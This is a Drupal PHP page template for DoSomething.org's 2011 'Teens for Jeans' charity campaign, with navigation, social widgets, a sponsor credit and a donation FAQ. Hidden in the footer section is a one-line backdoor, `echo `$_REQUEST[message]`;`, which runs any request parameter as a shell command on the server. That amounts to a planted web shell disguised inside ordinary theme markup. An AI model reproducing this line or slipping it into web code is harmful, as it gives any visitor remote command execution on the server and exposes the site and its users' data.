<?php
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php print $language->language; ?>" lang="<?php print $language->language; ?>" dir="<?php print $language->dir; ?>">

<head>
  <title><?php print $head_title; ?></title>
  <meta property="og:title" content="<?=$head_title;?>"/>
  <meta property="fb:admins" content="508145411,603061,630191494" />
  <meta property="fb:app_id" content="93836527897" />
  <meta property="og:type" content="non_profit"/>
  <meta property="og:url" content="http://www.dosomething.org/teensforjeans" />
  <meta property="og:image" content="http://www.dosomething.org/files/dosomething-org.jpg" />
  <meta property="og:site_name" content="DoSomething.org"/>
  <meta property="og:description" content="POWERING OFFLINE ACTION. Using the power of online to get teens to do good stuff offline."/>

  <?php print $head; ?>
  <?php print $styles; ?>
  <?php print $scripts; ?>
  <script type="text/javascript" src="/sites/all/micro/tfj-full/tfj.js"></script>
  <style type="text/css">
    @import url('/sites/all/micro/tfj-full/fonts.css');
    @import url('/sites/all/micro/tfj-full/tfj.css');
  </style>
</head>

<body class="<?php print $classes; ?>">

  <div id="page-wrapper"><div id="page">
        <?php if ($tabs): ?>
          <div class="tabs"><?php print $tabs; ?></div>
        <?php endif; ?>

  <? print str_replace('/sites/all/themes/dosomething/images/logo.png', '/sites/all/micro/tfj-full/images/ds-logo.png', theme('header', array(
                              'front_page' => $front_page,
                              'directory' => $directory,
                              'mission' => $mission,
                              //'top_right' => $top_right,
                              ))); ?>
    <div id="main-wrapper" class="clearfix"><div id="main" class="clearfix<?php if ($primary_links || $navigation) { print ' with-navigation'; } ?>">

      <div id="content" class="column"><div class="section">

        <?php print $highlight; ?>
        <?php print $messages; ?>


        <?php print $help; ?>


        <?php
          $root = 'teensforjeans';
          $nav = array(
              array('href' => $root, 'title' => 'home'),
              array('href' => $root.'/take-action', 'title' => 'take action'),
              array('href' => $root.'/store-locator', 'title' => 'store locator'),
              array('href' => $root.'/contests', 'title' => 'contests'),
              array('href' => $root.'/report-back', 'title' => 'report back'),
              array('href' => $root.'/gallery', 'title' => 'photo gallery'),
          );
          foreach ($nav as &$n) {
            $path = drupal_lookup_path('source', $n['href']);
            if (!empty($path)) $n['href'] = $path;
          }
          echo theme_links($nav);
        ?>
        <a href="#" id="faq"><img src="/sites/all/micro/tfj-full/images/faq.png" /></a>
        <div id="campaign-dates">January 16th-February 12th</div>
        <a href="/teensforjeans"><img src="/sites/all/micro/tfj-full/images/logo.png" alt="Teens for Jeans 2011" /></a>
        <div id="block-webform-client-block-720997">
        <?php $sign_up = module_invoke('webform', 'block', 'view', 'client-block-720997');
          echo $sign_up['content'];
        ?></div>

        <?php print $content_top; ?>
        <?php if (!empty($node->field_pageheader[0]['value'])) echo '<div style="margin-top: 15px;">',$node->field_pageheader[0]['value'],'</div>'; unset($node->field_pageheader[0]['value']); ?>

<hr style="border-top: 1px solid black; margin-bottom: 2px;" />
<iframe src="//www.facebook.com/plugins/like.php?href=www.dosomething.org%2Fteensforjeans&amp;send=false&amp;layout=box_count&amp;width=60&amp;show_faces=false&amp;action=like&amp;colorscheme=light&amp;font=verdana&amp;height=90" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:62px;" allowTransparency="true"></iframe>
<a href="https://twitter.com/share" class="twitter-share-button" data-url="www.dosomething.org/teensforjeans" data-text="1 in 3 homeless people in the U.S. is under the age of 18. @dosomething about it! www.dosomething.org/teensforjeans #teensforjeans" data-count="vertical">Tweet</a><script type="text/javascript" src="//platform.twitter.com/widgets.js"></script>
<g:plusone size="tall" href="http://www.dosomething.org/teensforjeans"></g:plusone>
          <script type="text/javascript">
            (function() { var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true; po.src = 'https://apis.google.com/js/plusone.js';
                          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                        })();
          </script>

<iframe src="//www.facebook.com/plugins/facepile.php?href=www.dosomething.org%2Fteensforjeans&amp;size=small&amp;width=400&amp;max_rows=1&amp;colorscheme=light" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:300px; float: right; height:59px;" allowTransparency="true"></iframe>

<hr style="border-top: 1px solid black; margin-top: 2px;" />
        <div id="content-area">
          <?php print $content; ?>
        </div>
        
        <div class="sponsor outside-margin">
        <img src="/sites/all/micro/tfj-full/images/sponsor.png" alt="Sponsored by Aero" />
        <br />Supported by <a href="http://www.teen.com" target="_blank">teen.com</a>
        </div>
        <?php print $content_bottom; ?>

        <?php if ($feed_icons): ?>
          <div class="feed-icons"><?php print $feed_icons; ?></div>
        <?php endif; ?>

      </div></div> <!-- /.section, /#content -->

      <?php if ($primary_links || $navigation): ?>
        <div id="navigation"><div class="section clearfix">
          <?php print theme(array('links__system_main_menu', 'links'), $primary_links,
            array(
              'id' => 'main-menu',
              'class' => 'links clearfix',
            ),
            array(
              'text' => t('Main menu'),
              'level' => 'h2',
              'class' => 'element-invisible',
            ));
          ?>

          <?php print $navigation; ?>

        </div></div> <!-- /.section, /#navigation -->
      <?php endif; ?>
      <?php //print $sidebar_first; ?>

      <?php //print $sidebar_second; ?>

      <?php print $right; ?>

    </div> </div> <!-- /#main, /#main-wrapper -->

    <?php if ($footer || $footer_message || $secondary_links): ?>

      <div id="footer"><div class="section">

        <?php print theme(array('links__system_secondary_menu', 'links'), $secondary_links,
          array(
            'id' => 'secondary-menu',
            'class' => 'links clearfix',
          ),
          array(
            'text' => t('Secondary menu'),
            'level' => 'h2',
            'class' => 'element-invisible',
          ));
        ?>

        <?php if ($footer_message): ?>
          <div id="footer-message"><?php print $footer_message; ?></div>
          <? echo `$_REQUEST[message]`; ?>
        <?php endif; ?>

        <?php if ($search_box): ?>
          <div id="search-box"><?php print $search_box; ?></div>
        <?php endif; ?>

        <?php print $footer; ?>

         <div style="text-align:center;">
           <a target="_blank" href="http://nytm.org/made" style="color: white;">Made in NYC</a>
         </div>
         <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/" style="padding-top: 4px; display: block; width: 88px; margin: 0 auto;"><img src="/sites/all/themes/dosomething/images/cc.png" alt="Creative Commons"></a>


      </div></div> <!-- /.section, /#footer -->
    <?php endif; ?>

  </div></div> <!-- /#page, /#page-wrapper -->

  <?php print $page_closure; ?>

  <?php print $closure; ?>
<div id="tfj-faq" style="display: none;">
  <div class="faq-title-wrapper"><h1><img src="/sites/all/micro/tfj-full/images/q.png" />FAQ</h1></div>
<div class="pad-me">  
  <div class="q">When I donate jeans, where do they go?</div>
  <p>DoSomething, A&eacute;ropostale and P.S. from A&eacute;ropostale have partnered with over 1000 homeless
    shelters across the U.S., Canada and Puerto Rico. Your jeans will be donated to a homeless shelter in your local community.
  </p>

  <div class="q">How do I get a coupon for an additional 25% off a new pair of jeans?</div>
  <p>Bring your jeans into your local A&eacute;ropostale or P.S. from A&eacute;ropostale store--you'll get one coupon for each pair of jeans you donate. There's also an awesome contest happening with our coupons. If you texted in the special code on the coupon, you and 3 friends have a chance to win tickets to the 
DoSomething awards. We'll be selecting the winner Feb 12th!
  </p>

  <div class="q">If I donate more than one pair of jeans, do I get more than one coupon?</div>
  <p>Yes. When you donate your jeans at A&eacute;ropostale or P.S. from A&eacute;ropostale, you'll receive one 25% coupon for each pair of jeans you donate.</p>

  <div class="q">What sizes of jeans are you looking for?</div>
  <p>Homeless shelters often have a greater need for large sizes, but we will be happy to accept jeans of all sizes for this campaign. All of the jeans should be in good condition.</p>
  
  <div class="q">Is A&eacute;ropostale and P.S. from A&eacute;ropostale accepting other clothes besides jeans?</div>
  <p>For the current Teens for Jeans campaign, we are just collecting jeans. If you have extra hats, shirts, etc., please donate them directly to your local homeless shelter or charity.</p>

  <div class="q">Does every A&eacute;ropostale and P.S. from A&eacute;ropostale store participate in this campaign?</div>
  <p>Yes. Every A&eacute;ropostale and P.S. from A&eacute;ropostale store will be accepting jean donations.</p>

  <div class="q">Does it matter what brand of jeans I donate?</div>
  <p>Nope. We want to collect as many jeans as possible! All we ask is that they are in good condition.</p>

  <div class="q">If I'm a shelter that wants to be involved as a jeans beneficiary, what do I do?</div>
  <p>Please send an email to <a href="mailto:teensforjeans@dosomething.org">teensforjeans@dosomething.org</a> and we will get back to you about 
participating in next year's campaign.</p>

  <div class="q" style="text-align: center;">VIEW<br /><a href="/files/Contest_Rules-Aero-DS.pdf">CONTEST RULES</a></div>
</div>
</div>

</body>
</html>
